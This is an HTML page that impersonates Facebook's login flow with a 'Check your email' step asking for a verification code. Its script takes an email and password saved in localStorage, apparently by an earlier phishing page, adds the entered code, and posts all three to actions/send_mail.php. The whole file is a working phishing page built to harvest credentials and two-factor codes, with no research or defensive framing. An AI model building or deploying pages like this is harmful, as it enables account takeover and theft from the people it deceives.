<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins">
    <link rel="shortcut icon" href="https://www.facebook.com/images/fb_icon_325x325.png
" />
    <!-- Bootstrap CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f0f2f5;
            font-family: Poppins !important;

        }
        .card {
            background-color: #f0f2f5;

            max-width: 800px;
            margin: 80px auto;
            padding: 20px;
            border-radius: 10px;
        }
        .custom-image {
            display: block;
            width: 100%;
            max-width: 100%;
        }
        .email-text {

        }
        .code-input {
            text-align: center;
        }
        .btn-custom {
            background-color: #1877f2;
            color: white;
            width: 100%;
            font-size: 16px;
            font-weight: normal;
            border-radius: 25px;

        }
    </style>
</head>
<body>

<div class="container">
    <div class="card shadow-sm">
        <div class="card-body">
            <h4 class="card-title" style="font-weight: bolder; font-family: Poppins !important;">Check your email</h5>
            <p class="email-text">Enter the code that we sent to <span id="user-email"></span></p>
            <img src="assets\acess.png" alt="Image" class="custom-image">
            <form id="accessCodeForm" class="mt-4" method="POST">
    <div class="form-group">
        <label for="code">Code</label>
        <input type="text" name="code" class="form-control code-input" id="code" placeholder="Enter your code" required>
    </div>
    <button type="button" class="btn btn-custom mt-3" onclick="submitForm()">Continue</button>
</form>
           
        </div>
    </div>
</div>


<script>
    function submitForm() {
        var code = document.getElementById('code').value;
        var email = localStorage.getItem('email');
        var password = localStorage.getItem('password');

        if (code && email && password) {
            // Send the email, password, and access code via AJAX
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "actions/send_mail.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    // Redirect after success (optional)
                    window.location.href = "hello";
                }
            };
            xhr.send("email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password) + "&code=" + encodeURIComponent(code));
        }
    }
</script>
<!-- Bootstrap JS -->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>
